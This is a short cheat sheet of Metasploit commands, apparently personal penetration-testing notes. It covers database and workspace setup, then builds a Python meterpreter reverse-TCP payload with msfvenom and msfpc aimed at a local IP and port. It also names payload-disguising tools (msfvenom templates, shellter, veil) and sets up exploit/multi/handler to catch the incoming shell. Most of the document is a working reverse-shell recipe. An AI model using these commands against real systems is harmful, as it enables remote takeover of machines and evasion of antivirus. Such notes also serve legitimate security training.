cd /usr/share/metasploit-framework

Maintain Database:

	- msfdb
	- msfdb init
	- msfdb delete
	- msfdb reinit

Create workspace:

	- workspace -h
	- workspace -a project (add & select)
	- workspace -d project (delete & select default)
	- workspace project (change)

	- creds (check credentials)

Create Payloads:

	- msfpc Python 192.168.0.137 8080

msfpc use msfvenom to create payload and give you a file to execute msfconsole easily.

	- msfvenom -l
	- msfvenom -p python/meterpreter/reverse_tcp  lhost=192.168.0.116 lport=8888 > reverce_tcp.py

	- msfvenom + template

	- shellter + template

	- veil

Use Exploits:

	- use exploit/multi/handler
	- options

	- set payload python/meterpreter/reverse_tcp
	- set lhost 192.168.0.116
	- set lport 8888

	- run

Install on Mac OS:

	- here is the download for Mac

cd /opt/metasploit-framework/bin/